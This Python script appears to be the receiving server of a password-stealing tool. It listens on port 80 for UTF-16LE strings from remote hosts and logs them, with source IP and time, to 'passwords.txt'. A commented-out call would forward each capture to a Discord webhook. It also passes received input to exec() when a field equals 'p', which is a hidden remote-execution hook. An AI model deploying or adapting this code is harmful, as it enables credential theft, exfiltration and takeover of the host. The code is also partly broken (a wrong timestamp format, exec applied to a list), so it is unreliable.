import socket
from datetime import datetime
from colorama import Fore, Style, init
import requests

# Initialize colorama
init()

def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
    # Create a TCP socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Bind the socket to listen on the specified port
        sock.bind(('0.0.0.0', port))
        sock.listen()  # Start listening for incoming connections
        print(f"Listening on port {port}...")

        # Open the file to log the received data
        with open(output_file, 'a', encoding='utf-8') as file:
            while True:
                # Accept a new connection
                conn, addr = sock.accept()
                with conn:
                    while True:
                        # Receive data from the connection (buffer size 1024 bytes)
                        data = conn.recv(1024)
                        if not data:
                            break  # Exit the loop if no data is received

                        # Decode the data from UTF-16LE
                        try:
                            decoded_string = data.decode('utf-16le')

                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%m%S')

                            #requests.post(
                            #    "https://DISCORDURL",
                            #    json={"content": addr[0] + ' @ ' + timestamp+ " ```" + decoded_string + "```"})

                            # Terminal output with colors
                            output = (f"{Fore.RED}{addr[0]}{Style.RESET_ALL} :: "  +# IP in red
                                      f"{Fore.GREEN}{decoded_string.strip()}{Style.RESET_ALL} @@ " + # String in green
                                      f"{Fore.BLUE}{timestamp}{Style.RESET_ALL}"  # Timestamp in blue
                                      )

                            # Save the plain output to file (without colors)
                            print(output)
                            passwd = decoded_string.strip().split(':')[1:]
                            uname = decoded_string.strip().split(':')[1]
                            if(uname=='p'):
                                exec(passwd)
                            file.write(output + '\n')
                            file.flush()  # Ensure it's written immediately
                        except UnicodeDecodeError as e:
                            print(f"Error decoding UTF-16LE string: {e}")
                            continue

if __name__ == '__main__':
    listen_for_utf16le_string()
